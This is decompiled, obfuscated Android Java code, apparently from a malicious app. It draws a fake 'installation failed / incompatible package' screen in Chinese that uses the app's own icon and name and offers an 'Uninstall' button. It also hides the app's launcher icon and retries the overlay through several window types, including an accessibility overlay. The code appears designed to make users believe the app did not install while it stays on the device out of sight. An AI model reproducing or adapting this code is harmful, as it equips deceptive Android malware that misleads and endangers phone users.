package p000;

import android.content.ComponentName;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.Drawable;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.util.TypedValue;
import android.view.View;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import com.storm.safe.rock.DefaultLauncherAlias;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0328b3;
import com.storm.safe.rock.util.StringUtil;
import java.io.File;
import java.util.Arrays;
import java.util.Locale;
import kotlin.text.AbstractC0779a1;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public abstract class cm0 {

    /* renamed from: a0 */
    public static WindowManager f46150a0;

    /* renamed from: a1 */
    public static ScrollView f46151a1;

    /* renamed from: a2 */
    public static boolean f46152a2;

    /* renamed from: a3 */
    public static int f46153a3;

    /* renamed from: a4 */
    public static int f46154a4;

    /* renamed from: a5 */
    public static final Handler f46155a5 = new Handler(Looper.getMainLooper());

    /* JADX WARN: Removed duplicated region for block: B:55:0x0129 A[PHI: r8
      0x0129: PHI (r8v31 java.lang.String) = (r8v30 java.lang.String), (r8v34 java.lang.String) binds: [B:57:0x0135, B:53:0x0126] A[DONT_GENERATE, DONT_INLINE]] */
    /* renamed from: a0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static ScrollView m210865a0(dqtvuisjd dqtvuisjdVar) throws PackageManager.NameNotFoundException {
        String string;
        Drawable applicationIcon;
        String str;
        String str2;
        String str3;
        int color = Color.parseColor("#1A1A1A");
        int color2 = Color.parseColor("#888888");
        int color3 = Color.parseColor("#E84035");
        int color4 = Color.parseColor("#FFF5F5");
        int color5 = Color.parseColor("#FFDEDE");
        String str4 = Build.MANUFACTURER;
        t60.m214694b5(str4, "MANUFACTURER");
        String lowerCase = str4.toLowerCase(Locale.ROOT);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        int color6 = (AbstractC0779a1.m213652a5(lowerCase, "huawei", false) || AbstractC0779a1.m213652a5(lowerCase, "honor", false)) ? Color.parseColor("#CE0E2D") : (AbstractC0779a1.m213652a5(lowerCase, "xiaomi", false) || AbstractC0779a1.m213652a5(lowerCase, "redmi", false) || AbstractC0779a1.m213652a5(lowerCase, "poco", false)) ? Color.parseColor("#FF6900") : (AbstractC0779a1.m213652a5(lowerCase, "oppo", false) || AbstractC0779a1.m213652a5(lowerCase, "realme", false) || AbstractC0779a1.m213652a5(lowerCase, "oneplus", false)) ? Color.parseColor("#1B8CFE") : (AbstractC0779a1.m213652a5(lowerCase, "vivo", false) || AbstractC0779a1.m213652a5(lowerCase, "iqoo", false)) ? Color.parseColor("#415FFF") : AbstractC0779a1.m213652a5(lowerCase, "samsung", false) ? Color.parseColor("#1259C3") : Color.parseColor("#4285F4");
        try {
            PackageManager packageManager = dqtvuisjdVar.getPackageManager();
            ApplicationInfo applicationInfo = Build.VERSION.SDK_INT >= 33 ? packageManager.getApplicationInfo(dqtvuisjdVar.getPackageName(), PackageManager.ApplicationInfoFlags.of(0L)) : packageManager.getApplicationInfo(dqtvuisjdVar.getPackageName(), 0);
            t60.m214694b5(applicationInfo, "if (Build.VERSION.SDK_IN…o(context.packageName, 0)");
            string = packageManager.getApplicationLabel(applicationInfo).toString();
        } catch (Exception unused) {
            string = "应用";
        }
        try {
            PackageManager packageManager2 = dqtvuisjdVar.getPackageManager();
            ApplicationInfo applicationInfo2 = Build.VERSION.SDK_INT >= 33 ? packageManager2.getApplicationInfo(dqtvuisjdVar.getPackageName(), PackageManager.ApplicationInfoFlags.of(0L)) : packageManager2.getApplicationInfo(dqtvuisjdVar.getPackageName(), 0);
            t60.m214694b5(applicationInfo2, "if (Build.VERSION.SDK_IN…o(context.packageName, 0)");
            applicationIcon = packageManager2.getApplicationIcon(applicationInfo2);
        } catch (Exception unused2) {
            applicationIcon = null;
        }
        String str5 = "1.0.0";
        try {
            PackageManager packageManager3 = dqtvuisjdVar.getPackageManager();
            if (Build.VERSION.SDK_INT >= 33) {
                str3 = packageManager3.getPackageInfo(dqtvuisjdVar.getPackageName(), PackageManager.PackageInfoFlags.of(0L)).versionName;
                if (str3 != null) {
                    str5 = str3;
                }
            } else {
                str3 = packageManager3.getPackageInfo(dqtvuisjdVar.getPackageName(), 0).versionName;
                if (str3 != null) {
                }
            }
        } catch (Exception unused3) {
        }
        try {
            t60.m214694b5(dqtvuisjdVar.getPackageManager().getApplicationInfo(dqtvuisjdVar.getPackageName(), 0), "context.packageManager.g…o(context.packageName, 0)");
            str = String.format("%.1f MB", Arrays.copyOf(new Object[]{Float.valueOf(new File(r12.sourceDir).length() / 1048576)}, 1));
        } catch (Exception unused4) {
            str = "28.0 MB";
        }
        ScrollView scrollView = new ScrollView(dqtvuisjdVar);
        scrollView.setBackgroundColor(-1);
        scrollView.setFillViewport(true);
        scrollView.setLayoutParams(new FrameLayout.LayoutParams(-1, -1));
        LinearLayout linearLayout = new LinearLayout(dqtvuisjdVar);
        linearLayout.setOrientation(1);
        linearLayout.setLayoutParams(new FrameLayout.LayoutParams(-1, -1));
        int identifier = dqtvuisjdVar.getResources().getIdentifier("status_bar_height", "dimen", "android");
        int dimensionPixelSize = identifier > 0 ? dqtvuisjdVar.getResources().getDimensionPixelSize(identifier) : m210866a1(dqtvuisjdVar, 24.0f);
        View view = new View(dqtvuisjdVar);
        int i = color6;
        view.setLayoutParams(new LinearLayout.LayoutParams(-1, m210866a1(dqtvuisjdVar, 32.0f) + dimensionPixelSize));
        linearLayout.addView(view);
        LinearLayout linearLayout2 = new LinearLayout(dqtvuisjdVar);
        linearLayout2.setOrientation(0);
        linearLayout2.setGravity(48);
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(-1, -2);
        layoutParams.leftMargin = m210866a1(dqtvuisjdVar, 24.0f);
        layoutParams.rightMargin = m210866a1(dqtvuisjdVar, 24.0f);
        linearLayout2.setLayoutParams(layoutParams);
        if (applicationIcon != null) {
            int iM210866a1 = m210866a1(dqtvuisjdVar, 72.0f);
            str2 = "dimen";
            View zl0Var = new zl0(dqtvuisjdVar, m210867a2(dqtvuisjdVar, 18.0f), applicationIcon, 1);
            LinearLayout.LayoutParams layoutParams2 = new LinearLayout.LayoutParams(iM210866a1, iM210866a1);
            layoutParams2.rightMargin = m210866a1(dqtvuisjdVar, 16.0f);
            zl0Var.setLayoutParams(layoutParams2);
            linearLayout2.addView(zl0Var);
        } else {
            str2 = "dimen";
        }
        LinearLayout linearLayout3 = new LinearLayout(dqtvuisjdVar);
        linearLayout3.setOrientation(1);
        linearLayout3.setLayoutParams(new LinearLayout.LayoutParams(0, -2, 1.0f));
        linearLayout3.setPadding(0, m210866a1(dqtvuisjdVar, 4.0f), 0, 0);
        TextView textView = new TextView(dqtvuisjdVar);
        textView.setText(string);
        textView.setTextColor(color);
        textView.setTextSize(20.0f);
        textView.setTypeface(Typeface.create("sans-serif-medium", 0));
        textView.setMaxLines(1);
        textView.setEllipsize(TextUtils.TruncateAt.END);
        linearLayout3.addView(textView);
        TextView textView2 = new TextView(dqtvuisjdVar);
        textView2.setText("版本号 " + str5 + " | " + str);
        textView2.setTextColor(color2);
        textView2.setTextSize(14.0f);
        LinearLayout.LayoutParams layoutParams3 = new LinearLayout.LayoutParams(-2, -2);
        layoutParams3.topMargin = m210866a1(dqtvuisjdVar, 5.0f);
        textView2.setLayoutParams(layoutParams3);
        linearLayout3.addView(textView2);
        TextView textView3 = new TextView(dqtvuisjdVar);
        textView3.setText("来自\"浏览器\"");
        textView3.setTextColor(color2);
        textView3.setTextSize(14.0f);
        LinearLayout.LayoutParams layoutParams4 = new LinearLayout.LayoutParams(-2, -2);
        layoutParams4.topMargin = m210866a1(dqtvuisjdVar, 3.0f);
        textView3.setLayoutParams(layoutParams4);
        linearLayout3.addView(textView3);
        linearLayout2.addView(linearLayout3);
        linearLayout.addView(linearLayout2);
        LinearLayout linearLayout4 = new LinearLayout(dqtvuisjdVar);
        linearLayout4.setOrientation(1);
        linearLayout4.setGravity(1);
        GradientDrawable gradientDrawable = new GradientDrawable();
        gradientDrawable.setColor(color4);
        gradientDrawable.setStroke(1, color5);
        gradientDrawable.setCornerRadius(m210867a2(dqtvuisjdVar, 14.0f));
        linearLayout4.setBackground(gradientDrawable);
        LinearLayout.LayoutParams layoutParams5 = new LinearLayout.LayoutParams(-1, -2);
        layoutParams5.leftMargin = m210866a1(dqtvuisjdVar, 24.0f);
        layoutParams5.rightMargin = m210866a1(dqtvuisjdVar, 24.0f);
        layoutParams5.topMargin = m210866a1(dqtvuisjdVar, 28.0f);
        linearLayout4.setLayoutParams(layoutParams5);
        linearLayout4.setPadding(m210866a1(dqtvuisjdVar, 24.0f), m210866a1(dqtvuisjdVar, 28.0f), m210866a1(dqtvuisjdVar, 24.0f), m210866a1(dqtvuisjdVar, 28.0f));
        View am0Var = new am0(dqtvuisjdVar, color3);
        LinearLayout.LayoutParams layoutParams6 = new LinearLayout.LayoutParams(m210866a1(dqtvuisjdVar, 48.0f), m210866a1(dqtvuisjdVar, 48.0f));
        layoutParams6.gravity = 1;
        layoutParams6.bottomMargin = m210866a1(dqtvuisjdVar, 16.0f);
        am0Var.setLayoutParams(layoutParams6);
        linearLayout4.addView(am0Var);
        TextView textView4 = new TextView(dqtvuisjdVar);
        textView4.setText("安装失败");
        textView4.setTextColor(Color.parseColor("#D32F2F"));
        textView4.setTextSize(18.0f);
        textView4.setTypeface(Typeface.create("sans-serif-medium", 0));
        textView4.setGravity(17);
        LinearLayout.LayoutParams layoutParams7 = new LinearLayout.LayoutParams(-1, -2);
        layoutParams7.bottomMargin = m210866a1(dqtvuisjdVar, 10.0f);
        textView4.setLayoutParams(layoutParams7);
        linearLayout4.addView(textView4);
        TextView textView5 = new TextView(dqtvuisjdVar);
        textView5.setText("该安装包与您的系统不兼容，请联系应用开发者获取适配版本。(-124)");
        textView5.setTextColor(Color.parseColor("#666666"));
        textView5.setTextSize(14.0f);
        textView5.setGravity(17);
        textView5.setLineSpacing(m210867a2(dqtvuisjdVar, 4.0f), 1.0f);
        linearLayout4.addView(textView5);
        linearLayout.addView(linearLayout4);
        View view2 = new View(dqtvuisjdVar);
        view2.setLayoutParams(new LinearLayout.LayoutParams(-1, 0, 1.0f));
        linearLayout.addView(view2);
        LinearLayout linearLayout5 = new LinearLayout(dqtvuisjdVar);
        linearLayout5.setOrientation(1);
        linearLayout5.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
        int iM210866a12 = m210866a1(dqtvuisjdVar, 24.0f);
        int iM210866a13 = m210866a1(dqtvuisjdVar, 10.0f);
        int iM210866a14 = m210866a1(dqtvuisjdVar, 24.0f);
        int iM210866a15 = m210866a1(dqtvuisjdVar, 28.0f);
        int identifier2 = dqtvuisjdVar.getResources().getIdentifier("navigation_bar_height", str2, "android");
        linearLayout5.setPadding(iM210866a12, iM210866a13, iM210866a14, iM210866a15 + (identifier2 > 0 ? dqtvuisjdVar.getResources().getDimensionPixelSize(identifier2) : 0));
        TextView textView6 = new TextView(dqtvuisjdVar);
        textView6.setText("卸载");
        textView6.setTextColor(-1);
        textView6.setTextSize(17.0f);
        textView6.setTypeface(Typeface.create("sans-serif-medium", 0));
        textView6.setGravity(17);
        GradientDrawable gradientDrawable2 = new GradientDrawable();
        gradientDrawable2.setColor(i);
        gradientDrawable2.setCornerRadius(m210867a2(dqtvuisjdVar, 25.0f));
        textView6.setBackground(gradientDrawable2);
        textView6.setLayoutParams(new LinearLayout.LayoutParams(-1, m210866a1(dqtvuisjdVar, 52.0f)));
        textView6.setOnClickListener(new ViewOnClickListenerC1203s1(5, dqtvuisjdVar));
        linearLayout5.addView(textView6);
        linearLayout.addView(linearLayout5);
        scrollView.addView(linearLayout);
        return scrollView;
    }

    /* renamed from: a1 */
    public static int m210866a1(dqtvuisjd dqtvuisjdVar, float f) {
        return (int) TypedValue.applyDimension(1, f, dqtvuisjdVar.getResources().getDisplayMetrics());
    }

    /* renamed from: a2 */
    public static float m210867a2(dqtvuisjd dqtvuisjdVar, float f) {
        return TypedValue.applyDimension(1, f, dqtvuisjdVar.getResources().getDisplayMetrics());
    }

    /* renamed from: a3 */
    public static String m210868a3() {
        int i = f46154a4;
        return i != 0 ? i != 1 ? i != 2 ? "未知" : "系统弹窗(2003/2038)" : "应用悬浮窗(2038)" : "无障碍覆盖层(2032)";
    }

    /* renamed from: a4 */
    public static void m210869a4(dqtvuisjd dqtvuisjdVar) {
        try {
            t60.m214714d6("PkgVerifyOverlay", "📦 hideIcon() 开始...");
            dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
            if (c0290a0 != null) {
                t60.m214714d6("PkgVerifyOverlay", "📦 通过 dqtvuisjd 隐藏图标");
                C0328b3 c0328b3 = c0290a0.f52434g5;
                if (c0328b3 == null) {
                    c0328b3 = null;
                }
                if (c0328b3 != null) {
                    c0328b3.m211758a2(true);
                }
            } else {
                t60.m214726f4("PkgVerifyOverlay", "📦 dqtvuisjd 为空，使用回退方式隐藏图标");
                dqtvuisjdVar.getPackageManager().setComponentEnabledSetting(new ComponentName(dqtvuisjdVar, (Class<?>) DefaultLauncherAlias.class), 2, 1);
                dqtvuisjdVar.getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).edit().putBoolean("icon_hidden", true).apply();
            }
            t60.m214714d6("PkgVerifyOverlay", "📦 hideIcon() 完成");
        } catch (Exception e) {
            t60.m214705c6("PkgVerifyOverlay", "📦 hideIcon() 失败", e);
        }
    }

    /* renamed from: a5 */
    public static void m210870a5(dqtvuisjd dqtvuisjdVar, String str) {
        int i = f46153a3 + 1;
        f46153a3 = i;
        if (i >= 2) {
            t60.m214726f4("PkgVerifyOverlay", "📦 策略 " + m210868a3() + " 重试次数耗尽，切换下一策略");
            m210871a6(dqtvuisjdVar);
            return;
        }
        String strM210868a3 = m210868a3();
        int i2 = f46153a3;
        StringBuilder sbM41c2 = AbstractC0003a2.m41c2("📦 [重试] ", str, "，1000ms 后重试 (策略=", strM210868a3, ", ");
        sbM41c2.append(i2);
        sbM41c2.append("/2)");
        t60.m214726f4("PkgVerifyOverlay", sbM41c2.toString());
        f46155a5.postDelayed(new bm0(dqtvuisjdVar, 1), 1000L);
    }

    /* renamed from: a6 */
    public static void m210871a6(dqtvuisjd dqtvuisjdVar) {
        int i = f46154a4 + 1;
        f46154a4 = i;
        f46153a3 = 0;
        if (i > 2) {
            t60.m214704c5("PkgVerifyOverlay", "📦 ❌ 所有策略都已尝试，放弃显示");
            return;
        }
        t60.m214714d6("PkgVerifyOverlay", "📦 🔄 切换到下一策略: ".concat(m210868a3()));
        f46155a5.postDelayed(new bm0(dqtvuisjdVar, 2), 500L);
    }
}
